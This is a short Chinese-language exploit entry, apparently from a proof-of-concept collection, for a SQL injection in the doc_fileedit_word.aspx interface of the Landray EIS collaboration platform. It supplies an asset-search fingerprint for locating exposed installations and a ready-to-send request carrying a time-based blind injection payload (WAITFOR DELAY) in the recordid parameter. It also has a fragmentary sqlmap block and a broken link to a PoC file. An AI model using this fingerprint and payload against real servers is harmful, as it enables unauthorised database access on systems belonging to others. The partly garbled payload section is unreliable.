# 蓝凌EIS智慧协同平台doc_fileedit_word接口SQL注入漏洞

- **系统**：蓝凌EIS智慧协同平台doc_fileedit_word接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`GET /dossier/doc_fileedit_word.aspx?recordid=2015122918374828%27%3BWAITFOR%20DELAY%20%270:0:5%27--&edittype=1,1 HTTP/1.1`

**请求体 / payload**
```

sqlmap
GET /dossier/doc_fileedit_word.aspx?recordid=2015122918374828&edittype=1,1 HTTP/1.1
Host:

\[蓝凌-EIS-doc-fileedit-word-sql注入\_poc.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台doc\_fileedit\_word接口SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台